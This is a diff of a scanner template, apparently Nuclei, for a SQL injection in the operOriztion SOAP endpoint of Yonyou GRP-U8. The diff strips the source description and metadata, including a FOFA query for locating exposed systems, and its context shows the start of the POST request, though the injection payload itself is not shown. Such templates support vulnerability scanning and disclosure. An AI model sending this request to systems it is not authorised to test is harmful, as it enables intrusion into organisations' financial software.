@@ -3,12 +3,8 @@ info:
   name: 用友GRP-U8 operOriztion SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rz8mgcgz738wu8qb'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rz8mgcgz738wu8qb
-    fofa: app="用友-GRP-U8"
 http:
 - raw:
   - 'POST /services/operOriztion HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     SOAPAction: ""
-
-
 
 
     <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
